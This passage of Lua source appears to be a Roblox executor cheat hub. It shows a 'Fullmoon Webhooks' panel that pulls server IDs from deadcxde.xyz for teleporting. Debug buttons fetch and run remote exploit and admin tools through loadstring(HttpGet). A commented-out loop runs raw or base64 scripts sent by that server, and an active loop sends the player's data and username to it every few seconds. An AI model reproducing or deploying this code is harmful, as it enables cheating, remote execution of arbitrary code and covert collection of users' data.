                WebhookJoinButton.Font = Enum.Font.Gotham
                WebhookJoinButton.RichText = true
                WebhookJoinButton.Text = "Join"
                WebhookJoinButton.TextColor3 = Color3.fromRGB(245, 245, 245)
                WebhookJoinButton.TextSize = 16.000
                WebhookJoinButton.TextXAlignment = Enum.TextXAlignment.Center
                WebhookJoinButton.MouseButton1Click:Connect(function()
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, JobId)
                end)

                WebhookCopyButton.Name = "copyWebhook" .. math.random(0,999999)
                WebhookCopyButton.Parent = frame
                WebhookCopyButton.BackgroundTransparency = 0.2
                WebhookCopyButton.AutoButtonColor = false
                WebhookCopyButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
                WebhookCopyButton.BorderSizePixel = 0
                WebhookCopyButton.Position = UDim2.new(1, -60, 0, WebhookOffset + 3)
                WebhookCopyButton.Size = UDim2.new(0, 60, 0, 17)
                WebhookCopyButton.Font = Enum.Font.Gotham
                WebhookCopyButton.RichText = true
                WebhookCopyButton.Text = "Copy"
                WebhookCopyButton.TextColor3 = Color3.fromRGB(245, 245, 245)
                WebhookCopyButton.TextSize = 16.000
                WebhookCopyButton.TextXAlignment = Enum.TextXAlignment.Center
                WebhookCopyButton.MouseButton1Click:Connect(function()
                    setclipboard(JobId)
                end)

                WebhookOffset = WebhookOffset + 30
            end

            FrameMain.Name = "Main"
            FrameMain.Parent = MainScreenGui
            FrameMain.BackgroundTransparency = 0
            FrameMain.BackgroundColor3 = Color3.fromRGB(1,1,1)
            FrameMain.ClipsDescendants = true
            FrameMain.Position = UDim2.new(0.15, 0, 0.05, 0)
            FrameMain.Size = UDim2.new(0, 370, 0, 600)

            FrameTitle.Name = "frameTitle"
            FrameTitle.Parent = FrameMain
            FrameTitle.BackgroundTransparency = 1
            FrameTitle.BorderSizePixel = 0
            FrameTitle.Position = UDim2.new(0.5, -70, 0.001, 0)
            FrameTitle.Size = UDim2.new(0, 204, 0, 16)
            FrameTitle.Font = Enum.Font.Gotham
            FrameTitle.RichText = true
            FrameTitle.Text = "Fullmoon Webhooks"
            FrameTitle.TextColor3 = Color3.fromRGB(245, 245, 245)
            FrameTitle.TextSize = 20.000
            FrameTitle.TextXAlignment = Enum.TextXAlignment.Left


            FrameCloseButton.Name = "frameClose"
            FrameCloseButton.Parent = FrameMain
            FrameCloseButton.BackgroundTransparency = 0.2
            FrameCloseButton.AutoButtonColor = false
            FrameCloseButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
            FrameCloseButton.BorderSizePixel = 0
            FrameCloseButton.Position = UDim2.new(1, -60, 0.002, 0)
            FrameCloseButton.Size = UDim2.new(0, 60, 0, 20)
            FrameCloseButton.Font = Enum.Font.Gotham
            FrameCloseButton.RichText = true
            FrameCloseButton.Text = "X"
            FrameCloseButton.TextColor3 = Color3.fromRGB(245, 245, 245)
            FrameCloseButton.TextSize = 20.000
            FrameCloseButton.TextXAlignment = Enum.TextXAlignment.Center
            FrameCloseButton.MouseButton1Click:Connect(function()
                for i,v in pairs(game.CoreGui:GetChildren()) do
                    if v:IsA("ScreenGui") and v.Name == "FullmoonWebhook" then
                        v:Destroy()
                    end
                end
            end)

            FrameRefreshButton.Name = "frameRefresh"
            FrameRefreshButton.Parent = FrameMain
            FrameRefreshButton.BackgroundTransparency = 0.2
            FrameRefreshButton.AutoButtonColor = false
            FrameRefreshButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
            FrameRefreshButton.BorderSizePixel = 0
            FrameRefreshButton.Position = UDim2.new(0, 0, 0.002, 0)
            FrameRefreshButton.Size = UDim2.new(0, 80, 0, 20)
            FrameRefreshButton.Font = Enum.Font.Gotham
            FrameRefreshButton.RichText = true
            FrameRefreshButton.Text = "Refresh"
            FrameRefreshButton.TextColor3 = Color3.fromRGB(245, 245, 245)
            FrameRefreshButton.TextSize = 20.000
            FrameRefreshButton.TextXAlignment = Enum.TextXAlignment.Center
            FrameRefreshButton.MouseButton1Click:Connect(function()
                for i,v in pairs(FrameMain:GetChildren()) do
                    if v.Name == "WebhookFrame" then
                        v:Destroy()
                    end
                end
                FrameWebhook = Instance.new("Frame")
                FrameWebhook.Name = "WebhookFrame"
                FrameWebhook.Parent = FrameMain
                FrameWebhook.BackgroundTransparency = 0
                FrameWebhook.BackgroundColor3 = Color3.fromRGB(1,1,1)
                FrameWebhook.ClipsDescendants = true
                FrameWebhook.Position = UDim2.new(0, 0, 0, 30)
                FrameWebhook.Size = UDim2.new(0, 370, 0, 600)

                r = game:HttpGet("https://deadcxde.xyz/api/getWebhooks.php?type=fullmoon")
                resp = game:GetService("HttpService"):JSONDecode(r)
                WebhookOffset = 0
                for i, webhook in ipairs(resp) do
                    createWebhook(FrameWebhook, webhook['JobId'], webhook['time'], webhook['time_remaining'])
                end
            end)

            

        end)


        function findKeyCode(keyNum)
            for i,v in pairs(Enum.KeyCode:GetEnumItems()) do
                if v.Value == keyNum then
                    return v
                end
            end
            return Enum.KeyCode.RightShift
        end
        
        local uiTab = Window:NewTab("UI Settings")
        local uiSection = uiTab:NewSection("UI Settings")
        uiSection:NewKeybind("Show/Hide UI (Default: RShift)", findKeyCode(getgenv().EuphoriaSettings["uibutton"]), function(key)
            Library:ToggleUI()
            _G.LastKey = key
        end)
        spawn(
            function()
                while wait() do
                    if _G.LastKey ~= nil and _G.LastKey.Value ~= getgenv().EuphoriaSettings["uibutton"] then
                        getgenv().EuphoriaSettings["uibutton"] = _G.LastKey.Value
                        wait(1)
                        WriteSettings()
                    end
                    wait(2)
                end
            end
        )
        
        local debugTab = Window:NewTab("Debug Menu")
        local debugSection = debugTab:NewSection("Debug")
        debugSection:NewButton("Copy CFrame", function()
            setclipboard(tostring(LP.Character.HumanoidRootPart.CFrame))
        end)
        debugSection:NewButton("Copy Vector3", function()
            setclipboard("Vector3.new(" .. tostring(LP.Character.HumanoidRootPart.CFrame.Position) .. ")")
        end)
        debugSection:NewLabel(" ")
        debugSection:NewButton(
            "IY ADMIN",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
            end    
        )
        debugSection:NewButton(
            "CMD-X",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
            end    
        )
        debugSection:NewButton(
            "DEX",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
            end    
        )
        debugSection:NewButton(
            "Simple Spy",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
            end    
        )

        debugSection:NewButton(
            "PlayerData Test",
            function()
                print(PlayerData.BlueGear)
            end    
        )

        
        if not _G.ServerKey then _G.ServerKey = LP.Name end
        -- spawn(function()
        --     while task.wait(1) do
        --         st, err = pcall(function()
        --             r = game:HttpGet("https://deadcxde.xyz/api/getCommand.php?key=".._G.ServerKey)
        --             resp = game:GetService("HttpService"):JSONDecode(r)
        --             for i,cmd in pairs(resp) do
        --                 if cmd['type'] == "raw_script" then
        --                     loadstring(cmd['value'])()
        --                 end
        --                 if cmd['type'] == "raw_script_base64" then
        --                     loadstring(base64:decode(cmd['value']))()
        --                 end
        --                 if cmd['type'] == "hop_server" then
        --                     TeleportService:TeleportToPlaceInstance(game.PlaceId, cmd['value'])
        --                 end
        --             end
        --         end)
        --         if err then print(err) end
        --     end
        -- end)
        spawn(function()
            while  wait() do
                st, err = pcall(function()
                    r = game:HttpGet("https://deadcxde.xyz/api/setOnline.php?data="..tostring(game:GetService("HttpService"):JSONEncode(PlayerData)).."&name="..LP.Name.."&ts="..tostring(os.time()))
                    wait(5)
                end)
                if err then print(err) end
            end
        end)
    end
end)
print(status, err, debug.traceback())